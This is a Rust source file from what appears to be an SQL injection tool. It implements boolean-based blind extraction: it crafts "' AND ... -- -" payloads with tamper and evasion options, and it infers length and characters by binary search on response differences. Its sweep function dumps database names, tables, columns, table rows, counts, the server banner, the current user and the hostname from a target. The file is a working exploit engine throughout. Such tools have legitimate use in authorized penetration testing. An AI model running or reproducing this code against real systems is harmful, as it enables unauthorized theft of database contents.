#![deny(unsafe_code)]

//! Boolean-blind enumeration field extraction (P1).
//! Extracted verbatim from `orchestrator.rs`; no behaviour change.

use super::config::{BudgetConfig, EngineConfig, dbms_hint_kind};
use super::confirm::{first_finding_param, is_confirmed_finding};
use crate::{
    detection::baseline,
    error::InjektError,
    http::client::HttpClient,
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState},
    },
    target::{
        injection::{ProbeOpts, build_injection_spec_with_raw},
        markers::MarkerSet,
        parameters::TargetParameter,
        raw_request::RawRequest,
        url::TargetUrl,
    },
    techniques::{
        payload_opts::{PayloadOpts, build_final_payload_with_rng},
        tamper::Tamper,
    },
};
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{info, warn};

/// Helper to extract a single field (databases, tables, columns, dump, count) via boolean-based blind `SQLi`.
/// Uses binary search on ASCII values with the provided query.
/// Dialect-aware: length/char comparison built from `DbmsKind`
/// (`LEN` on MSSQL, `SUBSTR` on Oracle, `::text` cast on Postgres).
#[allow(clippy::too_many_arguments)]
#[allow(clippy::too_many_lines)]
pub(crate) async fn extract_enum_field(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    target: &TargetUrl,
    target_str: &str,
    param: &TargetParameter,
    marker_set: &MarkerSet,
    baseline_body: &str,
    baseline_mean: f64,
    query: String,
    label: String,
    raw: Option<&RawRequest>,
    tampers: &[Tamper],
    opts: ProbeOpts,
    dbms_kind: &crate::dbms::DbmsKind,
    popts: &PayloadOpts,
    matcher: &crate::detection::matcher::MatcherConfig,
    _ignore_codes: &[u16],
    seed: Option<u64>,
) -> Result<Option<String>, crate::error::InjektError> {
    // Seeded tamper RNG (`--seed`): same seed yields identical payloads;
    // `None` preserves the historical OS-random behaviour.
    let mut rng = crate::seeded_rng::make_rng(seed);
    let engine = crate::extraction::engine::ExtractionEngine::new(
        crate::extraction::engine::ExtractionConfig::default(),
    );

    // Single source of truth for dialect SQL: reuse the `DbmsDetector`
    // `length_expr` / `ascii_cmp_expr` impls instead of re-matching on kind.
    let detector = crate::dbms::common::detector_for_kind(dbms_kind);
    // Matcher pre-processing (`--text-only` strips HTML) is applied to both
    // baseline and fetched bodies before `diff_against_baseline` so the
    // comparison stays consistent. No veto by `--code`/`--string` here:
    // enumeration is detection-only (a veto would only hide data). Likewise
    // `_ignore_codes` is intentionally not honored: an ignored status still
    // carries the length/char differential, and skipping the guess would
    // truncate inference (`inferred_len` under-estimate). The parameter is
    // kept (prefixed `_`) so a future policy change needs no re-plumbing
    // of the 6 callers.
    let baseline_proc = matcher.pre_process(baseline_body);

    // First infer length (max 500 chars for enum results).
    // Transport/body errors are never scored: the guess is skipped (no
    // break, no length update) so a transient blip cannot truncate
    // inference. Persistent failure aborts gracefully with `Ok(None)`.
    let mut inferred_len = 0;
    let mut consecutive_errors = 0usize;
    for len_guess in 1..=500 {
        if cancel.is_cancelled() {
            break;
        }
        let base = format!("' AND {}>={len_guess} -- -", detector.length_expr(&query));
        let payload = build_final_payload_with_rng(&base, tampers, popts, &mut rng);
        let Some(spec) = build_injection_spec_with_raw(
            target, target_str, param, &payload, marker_set, raw, opts, popts,
        ) else {
            warn!(label=%label, len_guess, "enum probe spec build failed, skipping guess");
            continue;
        };
        let start = std::time::Instant::now();
        let resp = client.send_with_retry(spec, cancel).await;
        let ms = start.elapsed().as_secs_f64() * 1000.0;
        state.write().await.increment_requests();
        let raw_body = match resp {
            Ok(r) => match client.read_body_string_with_timeout(r).await {
                Ok(b) => b,
                Err(e) => {
                    warn!(error=%e, label=%label, len_guess, "enum probe body read failed, skipping guess");
                    consecutive_errors += 1;
                    if consecutive_errors >= 5 {
                        warn!(label=%label, "enum aborted after 5 consecutive transport errors");
                        return Ok(None);
                    }
                    continue;
                }
            },
            Err(e) => {
                warn!(error=%e, label=%label, len_guess, "enum probe failed, skipping guess");
                consecutive_errors += 1;
                if consecutive_errors >= 5 {
                    warn!(label=%label, "enum aborted after 5 consecutive transport errors");
                    return Ok(None);
                }
                continue;
            }
        };
        consecutive_errors = 0;
        let body = matcher.pre_process(&raw_body);
        let diff = crate::detection::response_diff::diff_against_baseline(
            &baseline_proc,
            &body,
            baseline_mean,
            ms,
            100.0,
        );
        if diff.confidence < 0.4 {
            inferred_len = len_guess;
        } else {
            break;
        }
    }
    if inferred_len == 0 {
        warn!(label=%label, "enumeration length inference failed");
        return Ok(None);
    }

    let client_clone = client.clone();
    let state_clone = Arc::clone(state);
    let cancel_clone = cancel.clone();
    let target_clone = target.clone();
    let target_str_clone = target_str.to_owned();
    let param_clone = param.clone();
    let marker_set_clone = marker_set.clone();
    let baseline_body_clone = baseline_proc.clone();
    let baseline_mean_clone = baseline_mean;
    let query_for_oracle = query.clone();
    let raw_for_oracle = raw.cloned();
    let tampers_for_oracle = tampers.to_vec();
    let dbms_for_oracle = *dbms_kind;
    let popts_for_oracle = (*popts).clone();
    let matcher_for_oracle = matcher.clone();
    let seed_for_oracle = seed;

    let oracle = move |pos: usize, mid: u8| {
        let client = client_clone.clone();
        let state = state_clone.clone();
        let cancel = cancel_clone.clone();
        let target = target_clone.clone();
        let target_str = target_str_clone.clone();
        let param = param_clone.clone();
        let marker_set = marker_set_clone.clone();
        let baseline_body = baseline_body_clone.clone();
        let query = query_for_oracle.clone();
        let raw = raw_for_oracle.clone();
        let tampers = tampers_for_oracle.clone();
        let dbms_kind = dbms_for_oracle;
        let popts = popts_for_oracle.clone();
        let matcher = matcher_for_oracle.clone();
        let seed = seed_for_oracle;
        async move {
            let detector = crate::dbms::common::detector_for_kind(&dbms_kind);
            let cmp = detector.ascii_cmp_expr(&query, pos, mid);
            let base = format!("' AND {cmp} -- -");
            // Fresh RNG per oracle call from the run seed: deterministic per
            // `--seed`, independent of async scheduling order.
            let mut oracle_rng = crate::seeded_rng::make_rng(seed);
            let payload = build_final_payload_with_rng(&base, &tampers, &popts, &mut oracle_rng);
            // Transport/body errors are retried (bounded) then propagated as
            // `Err` — never scored as `""`. The engine treats `Err` as an
            // abstention/retry, so one hiccup cannot corrupt a bit.
            let mut last_err: Option<String> = None;
            for _ in 0..3 {
                let Some(spec) = build_injection_spec_with_raw(
                    &target,
                    &target_str,
                    &param,
                    &payload,
                    &marker_set,
                    raw.as_ref(),
                    opts,
                    &popts,
                ) else {
                    warn!(pos, mid, "enum oracle spec build failed, retrying");
                    last_err = Some("invalid header/cookie value".to_owned());
                    continue;
                };
                let start = std::time::Instant::now();
                let resp = client.send_with_retry(spec, &cancel).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state.write().await.increment_requests();
                let raw_body = match resp {
                    Ok(r) => match client.read_body_string_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, pos, mid, "enum oracle body read failed, retrying");
                            last_err = Some(e.to_string());
                            continue;
                        }
                    },
                    Err(e) => {
                        warn!(error=%e, pos, mid, "enum oracle probe failed, retrying");
                        last_err = Some(e.to_string());
                        continue;
                    }
                };
                let body = matcher.pre_process(&raw_body);
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean_clone,
                    ms,
                    100.0,
                );
                return Ok::<bool, InjektError>(diff.confidence < 0.4);
            }
            Err::<bool, InjektError>(InjektError::Http(format!(
                "enum oracle transport failure at pos {pos} mid {mid}: {}",
                last_err.unwrap_or_else(|| "unknown".to_owned())
            )))
        }
    };

    let extracted = match engine.extract(inferred_len, oracle, cancel).await {
        Ok(value) => value,
        Err(crate::error::InjektError::Cancelled) => {
            return Err(crate::error::InjektError::Cancelled);
        }
        Err(error) => {
            // Speculative helper: an unstable oracle on a non-boolean sink is
            // the expected negative, not an actionable error. Demote to debug
            // so bulk scans don't drown in `inference inconsistency` noise.
            tracing::debug!(label=%label, error=%error, "enum oracle unstable, skipping field");
            return Ok(None);
        }
    };
    let exposed = {
        use secrecy::ExposeSecret;
        extracted.expose_secret().to_owned()
    };
    info!(label=%label, extracted=%crate::session::scrubber::Scrubber::hash_truncated(&exposed), len=%exposed.len(), "enumeration extracted");
    Ok(Some(exposed))
}

/// `--dbs/--tables/--columns/--dump/--count` sweep (moved verbatim from
/// `orchestrator.rs`, P1). Each target field is extracted through
/// [`extract_enum_field`]; the engine passes its client/state/cancel/config
/// explicitly (`Engine` fields are private to `orchestrator`).
/// Opt-in enumeration (`--dbs`/`--tables`/`--columns`/`--dump`/`--count`/
/// `--banner`/`--current-user`/`--current-db`/`--hostname`), reusing the
/// same injection point as extraction.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
pub(crate) async fn run_enumeration(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    target: &TargetUrl,
    target_str: &str,
    marker_set: &MarkerSet,
    raw_request: &Arc<Option<RawRequest>>,
    baseline: &baseline::Baseline,
    effective_tampers: &[Tamper],
    effective_opts: ProbeOpts,
) -> crate::error::Result<()> {
    if BudgetConfig::is_over_request_budget(
        state.read().await.request_count(),
        config.budget.request_budget,
    ) {
        warn!("request-budget spent, skipping enumeration");
        return Ok(());
    }
    // Reuse extraction context (`--dbms` hint wins over guessing).
    // Guess from confirmed findings only (see fingerprint gating).
    let (first_param, target_for_extract) = first_finding_param(state, target).await;

    let dbms_kind = if let Some(hint) = dbms_hint_kind(config) {
        hint
    } else {
        let snap = state.read().await.findings().to_vec();
        let confirmed: Vec<Finding> = snap
            .iter()
            .filter(|f| is_confirmed_finding(f))
            .cloned()
            .collect();
        crate::dbms::fingerprint::guess_from_findings(&confirmed)
            .unwrap_or(crate::dbms::DbmsKind::MySql)
    };

    let detector = crate::dbms::fingerprint::get_detector(dbms_kind);

    let baseline_body = baseline.representative_body_str();
    let baseline_mean = baseline.mean_ms;
    let client = client.clone();
    let state = Arc::clone(state);
    let cancel = cancel.clone();
    let target_str = target_str.to_owned();
    let marker_set = marker_set.clone();
    let raw_request_for_enum = raw_request.as_ref().clone();

    let start = config.enumeration.start.unwrap_or(0);
    let stop = config.enumeration.stop.unwrap_or(100);

    if config.enumeration.dbs {
        let query = detector.list_databases_query();
        let extracted = extract_enum_field(
            &client,
            &state,
            &cancel,
            &target_for_extract,
            &target_str,
            &first_param,
            &marker_set,
            &baseline_body,
            baseline_mean,
            query.clone(),
            "databases".to_owned(),
            raw_request_for_enum.as_ref(),
            effective_tampers,
            effective_opts,
            &dbms_kind,
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
        )
        .await?;
        if let Some(extracted) = extracted {
            info!(extracted=%Scrubber::hash_truncated(&extracted), "databases enumerated");
            state
                .write()
                .await
                .push_extracted(secrecy::SecretString::from(extracted));
        }
    }

    let target_db = config.enumeration.db.clone().unwrap_or_default();
    if config.enumeration.tables && !target_db.is_empty() {
        let query = detector.list_tables_query(&target_db);
        let extracted = extract_enum_field(
            &client,
            &state,
            &cancel,
            &target_for_extract,
            &target_str,
            &first_param,
            &marker_set,
            &baseline_body,
            baseline_mean,
            query.clone(),
            "tables".to_owned(),
            raw_request_for_enum.as_ref(),
            effective_tampers,
            effective_opts,
            &dbms_kind,
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
        )
        .await?;
        if let Some(extracted) = extracted {
            info!(extracted=%Scrubber::hash_truncated(&extracted), "tables enumerated for db={}", target_db);
            state
                .write()
                .await
                .push_extracted(secrecy::SecretString::from(extracted));
        }
    }

    let target_table = config.enumeration.table.clone().unwrap_or_default();
    if config.enumeration.columns && !target_db.is_empty() && !target_table.is_empty() {
        let query = detector.list_columns_query(&target_db, &target_table);
        let extracted = extract_enum_field(
            &client,
            &state,
            &cancel,
            &target_for_extract,
            &target_str,
            &first_param,
            &marker_set,
            &baseline_body,
            baseline_mean,
            query.clone(),
            "columns".to_owned(),
            raw_request_for_enum.as_ref(),
            effective_tampers,
            effective_opts,
            &dbms_kind,
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
        )
        .await?;
        if let Some(extracted) = extracted {
            info!(extracted=%Scrubber::hash_truncated(&extracted), "columns enumerated for {}.{}", target_db, target_table);
            state
                .write()
                .await
                .push_extracted(secrecy::SecretString::from(extracted));
        }
    }

    if config.enumeration.dump && !target_db.is_empty() && !target_table.is_empty() {
        let columns: Vec<String> = config
            .enumeration
            .column
            .clone()
            .map(|c| c.split(',').map(|s| s.trim().to_owned()).collect())
            .unwrap_or_default();
        let query = detector.dump_table_query(&target_db, &target_table, &columns, start, stop);
        let extracted = extract_enum_field(
            &client,
            &state,
            &cancel,
            &target_for_extract,
            &target_str,
            &first_param,
            &marker_set,
            &baseline_body,
            baseline_mean,
            query.clone(),
            "dump".to_owned(),
            raw_request_for_enum.as_ref(),
            effective_tampers,
            effective_opts,
            &dbms_kind,
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
        )
        .await?;
        if let Some(extracted) = extracted {
            info!(extracted=%Scrubber::hash_truncated(&extracted), "dump extracted for {}.{} rows {}-{}", target_db, target_table, start, stop);
            state
                .write()
                .await
                .push_extracted(secrecy::SecretString::from(extracted));
        }
    }

    if config.enumeration.count && !target_db.is_empty() && !target_table.is_empty() {
        let query = detector.count_rows_query(&target_db, &target_table);
        let extracted = extract_enum_field(
            &client,
            &state,
            &cancel,
            &target_for_extract,
            &target_str,
            &first_param,
            &marker_set,
            &baseline_body,
            baseline_mean,
            query.clone(),
            "count".to_owned(),
            raw_request_for_enum.as_ref(),
            effective_tampers,
            effective_opts,
            &dbms_kind,
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
        )
        .await?;
        if let Some(extracted) = extracted {
            info!(extracted=%Scrubber::hash_truncated(&extracted), "row count for {}.{}", target_db, target_table);
            state
                .write()
                .await
                .push_extracted(secrecy::SecretString::from(extracted));
        }
    }

    for (flag, query, label) in [
        (config.enumeration.banner, detector.banner_query(), "banner"),
        (
            config.enumeration.current_user,
            detector.current_user_query(),
            "current_user",
        ),
        (
            config.enumeration.current_db,
            detector.current_db_query(),
            "current_db",
        ),
        (
            config.enumeration.hostname,
            detector.hostname_query(),
            "hostname",
        ),
    ] {
        if !flag {
            continue;
        }
        let extracted = extract_enum_field(
            &client,
            &state,
            &cancel,
            &target_for_extract,
            &target_str,
            &first_param,
            &marker_set,
            &baseline_body,
            baseline_mean,
            query.clone(),
            label.to_owned(),
            raw_request_for_enum.as_ref(),
            effective_tampers,
            effective_opts,
            &dbms_kind,
            &config.evasion.payload_opts,
            &config.matcher,
            &config.net.ignore_codes,
            config.seed,
        )
        .await?;
        if let Some(extracted) = extracted {
            info!(extracted=%Scrubber::hash_truncated(&extracted), label=%label, "identity enumerated");
            state
                .write()
                .await
                .push_extracted(secrecy::SecretString::from(extracted));
        }
    }
    Ok(())
}
